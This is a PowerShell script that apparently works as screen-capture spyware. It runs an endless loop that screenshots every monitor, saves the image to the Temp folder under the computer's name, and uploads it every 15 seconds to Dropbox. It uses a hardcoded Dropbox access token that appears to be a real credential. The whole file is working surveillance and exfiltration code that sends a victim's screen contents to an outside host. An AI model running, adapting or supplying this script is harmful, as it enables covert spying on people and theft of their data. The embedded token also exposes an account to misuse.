function DropBox-Upload {

[CmdletBinding()]
param (
    
[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
[Alias("f")]
[string]$SourceFilePath
) 
$DropBoxAccessToken = "sl.u.AGD0s2cDvhiptyeNK_XCnm8ubFue8kHNxFrUI3Wa-PK2u7CPf7rtjuXSz2D8piZXer6mGXUgsxTnrwU_JrXNftrhnQyio2MJViGFkKDlKEv7rPiQDZ86xGVQDQTjjeO1KhVLhGZHp50CIypJDW16GTAO-h1Pky20ClpLKJIdzoSn2G8MkPN8JvuMfibTLvDITbg18K1GfeJ0cyrvQIpCUgt1ey72iC9-YP9jshbiVCg_NpHG7qcMQdvQvovvFNOfU0lVHpaAhHcbQW1dXDTEVKZtu7HRVR0VW2B10jFLS1_0XI5E0ZLkJh8nNOi2Qf_lA6wGjF-LtYauK-nsSQPJDnAEocDLBQmJLNhMSyV73hRxrFKuoU69lqnNZiAGRU4YcHUgAhP7QudPLMe40qay5ZYcaSLPih-b2CxqT1bOObfanU7ieOOGex9rfwB9ShPrCG08bnVJXokopClq0sKBn45-dwmcXJHoU1E-hBoqrCM_whemQWGjay-yMxen6XpNpTuN8h_bT-cHmKYPW3OZqf2Buam1fi5JeXVJmOH21XrboFRXaAOMdRfpAUtyX0r63HRmesQH16pvK2bZrHPVYH-6t1lxpPr_wvjZn5Ds9USj5A1NOpXtFW-bn2nqGZtwBVZTc2_HsRHnHv1dnIxsHls0RhjeiIbJBrLOpcrjxcO0NyuyAqwwgguvHmWb805dSA-Eewroi_3RUc_XoeDUwJjX2t-spm8uyxivgKJALHl-MPsQ6YMMtzFj3EQ_LLUOqBD26Tn6EACMbLc8is53Q3Ji8oveIsN3ksPeuTUvriwQFrqSlUXOj-zsgJIYgqIti2wPZMJ7MOrwP7n4DlHuI54iOj95hGa0bhZpF_w0hKCXxHkedGX1DdgLfgM07UiGbgiO9EwkLFi1EZLRcXH6kkelqCQkTgmbFybr1zkNKG3kYADBrTl5ggKrd2oqEGwCbUSE0KVhCd8khoF0Tu73KQcn5NxUOK3ccYlPmNz_pJj4G78b8fvylcIMQMRwK4itv1LGA02VauSUFW_fN4SEI1uBVn58ooWdAnW8R1xt40N6iW_YNR50ox252I_PVhOOjvWamKvVQUiyu4HImF6xPFhv3YB9LPhKChkgm3-33nCQvC6cLRuyiwTMJFcWj-UkDUiMkiFnq0GiFy_fI94vuhBHflXYJr3Hlth6mn0p4_ejV6blYybeo_s9SsDlxZd_DU9hEXxNkPn99yw8_4usCb6gLlGUEzbiyfJdANysMIcd5wvk5YtADQ9_IDOsn3SRwU7JG57bkIE29_Us1uMy3-MUEWsI7fXPlGlKCaWkvaZetWpHtcj9mX9EC13vphryGhTF9kMq2c40Ack6VZNpXGTIMOF9r4QLnCngozCEQ2EAOq61nMq0XiKomYgmU9bR2iOeHNGLvRsej2Q2to9iRgujNPvBVNXImXD92VBPyUJBwQShEp3hZ7KKhV3yemG-dIk"   # Replace with your DropBox Access Token
$outputFile = Split-Path $SourceFilePath -leaf
$TargetFilePath="/$outputFile"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $DropBoxAccessToken
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

while(1){

  Add-Type -AssemblyName System.Windows.Forms,System.Drawing

  $screens = [Windows.Forms.Screen]::AllScreens

  $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
  $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
  $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
  $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum

  $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
  $bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.width), ([int]$bounds.height)
  $graphics = [Drawing.Graphics]::FromImage($bmp)

  $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

  $bmp.Save("$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png")
  $graphics.Dispose()
  $bmp.Dispose()
  
  start-sleep -Seconds 15
 "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png" | DropBox-Upload
}
